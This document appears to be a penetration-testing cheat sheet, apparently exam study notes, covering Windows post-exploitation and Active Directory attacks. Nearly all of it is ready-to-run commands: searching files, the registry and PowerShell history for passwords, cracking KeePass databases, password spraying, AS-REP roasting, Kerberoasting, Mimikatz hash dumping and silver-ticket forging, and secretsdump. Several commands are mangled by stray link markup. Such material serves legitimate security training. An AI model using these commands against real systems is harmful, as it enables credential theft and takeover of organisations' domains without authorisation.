# Post Exploitation

### Post Exploitation

This is more windows specific as exam specific.

ðŸ’¡ Run WinPEAS.exe - This may give us some more detailed information as now we're a privileged user and we can open several files, gives some edge!

#### Sensitive Information

#### Powershell History

```bash
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
```

Example:

```bash
type C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
```

#### Searching for passwords

```bash
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

#### Searching in Registry for Passwords

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

ðŸ’¡ Always check documents folders, it may contain some juicy files

#### KDBX Files

These are KeyPassX password stored files

```bash
cmd> dir /s /b *.kdbx
```

```powershell
Ps> Get-ChildItem -Recurse -Filter *.kdbx
```

Cracking:

```bash
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

#### Dumping Hashes

1. Mimikatz
2. If this is a domain joined machine, then follow Post-exp steps for AD.

### Active Directory Pentesting

#### Enumeration

To check local administrators in domain joined machine

```bash
net localgroup Administrators
```

#### Powerview

```powershell
Import-Module .\\[PowerView.ps](<http://PowerView.ps>)1  #loading module to powershell, if it gives error then change execution policy
Get-NetDomain  #basic information about the domain
Get-NetUser  #list of all users in the domain
```

* The above command's outputs can be filtered using "select" command. For example, `Get-NetUser | select name`

```powershell
Get-NetGroup  # enumerate domain groups
Get-NetGroup "group name"  # information from specific group
Get-NetComputer  # enumerate the computer objects in the domain
Find-LocalAdminAccess  # scans the network in an attempt to determine if our current user has administrative access
Get-NetSession -ComputerName files04 -Verbose  #Checking logged on users with Get-NetSession
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # Listing SPN accounts in domain
Get-ObjectAcl -Identity USERNAME  # enumerates ACE(access control entities), lists SID(security identifier)
Convert-SidToName SID  # converting SID/ObjSID to name
```

* Checking for "GenericAll" right for a specific group, after obtaining they can be converted to name

```powershell
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier | select -ExpandProperty SecurityIdentifier | Convert-SidToName
Find-DomainShare  #find the shares in the domain
Get-DomainUser -PreauthNotRequired -verbose  # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname  #Kerberoastable accounts
```

#### Bloodhound

* Collection methods - database
* Sharphound - transfer [sharphound.ps](http://sharphound.ps)1 into the compromised machine

```powershell
Import-Module .\\[Sharphound.ps](<http://Sharphound.ps>)1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp\\ -OutputPrefix "name"
```

* Bloodhound-Python

```bash
bloodhound-python -u 'username' -p 'password' -ns DC_IP -d [DOMAIN.COM](<http://DOMAIN.COM>) -c all  #output will be in json format
```

* Running Bloodhound

```bash
sudo neo4j console
```

* then upload the .json files obtained

#### PsLoggedon

To see user logons at remote system of a domain(external tool)

```bash
PsLoggedon.exe \\\\TARGET_COMPUTER
```

#### Attacking Active Directory Authentication

ðŸ’¡ Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don't have proper creds.

#### Password Spraying

* Crackmapexec - check if the output shows 'Pwned!'

```bash
crackmapexec smb SUBNET_OR_IP -u users.txt -p 'password' -d DOMAIN --continue-on-success
```

* Kerbrute

```bash
kerbrute passwordspray -d [corp.com](<http://corp.com>) users.txt "password"
```

#### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #this gives us the hash
Rubeus.exe asreproast /nowrap  #dumping from compromised windows host
hashcat -m 18200 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Kerberoasting

```bash
Rubeus.exe kerberoast /outfile:hashes.kerberoast  #dumping from compromised windows host
impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #from kali machine
hashcat -m 13100 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Silver Tickets

* Obtaining hash of an SPN user using Mimikatz

```
privilege::debug
sekurlsa::logonpasswords  #obtain NTLM hash of the SPN account here
```

* Obtaining Domain SID

```powershell
ps> whoami /user
```

* this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369"
* Forging silver ticket using Mimikatz

```
kerberos::golden /sid:<domainsid> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit
```

* we can check the tickets by,

```powershell
ps> klist
```

* Accessing service

```powershell
ps> iwr -UseDefaultCredentials <http://web04.corp.com:8080/>
```

#### Secretsdump

```bash
[secretsdump.py](<http://secretsdump.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```
